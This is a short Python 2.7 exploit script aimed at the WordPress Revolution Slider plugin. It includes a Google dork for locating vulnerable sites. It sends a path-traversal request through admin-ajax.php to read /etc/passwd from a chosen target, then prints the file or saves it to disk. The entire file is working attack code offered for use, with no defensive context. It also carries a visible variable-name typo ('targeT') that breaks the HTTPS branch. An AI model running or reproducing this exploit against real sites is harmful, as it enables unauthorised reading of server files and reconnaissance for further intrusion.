#!/usr/bin/env python2.7
# google dork : revslider.php "index of"
import requests
import argparse
import sys
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", dest="target", help="e.g http://url.com", required=True)
args = parser.parse_args()
print "[*] Grabbing config..."
req = requests.get(str(args.target) + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../../etc/passwd")
if 'root' in req.text:
 view_etcpass = raw_input("[*] Save /etc/passwd to disk [y/n]?: ")
 if view_etcpass.strip() == 'Y' or view_etcpass.strip() == 'y':
  if 'http://' in args.target:
   target = args.target
   target = str(target)
   target = target.replace("http://", '')
  elif 'https://' in args.target:
   target = args.target
   target = str(targeT)
   target = target.replace("https://", '')
  f = open("../../downloaded/" + str(target) + "_etc_passwd", 'wb')
  f.write(req.text)
  f.close()
  print "[+] Downloaded successfully, exiting"
  sys.exit()
 else:
  print "[*] Printing /etc/passwd"
  print req.text
  sys.exit()
else:
 print "[!] Failed to download /etc/passwd!"

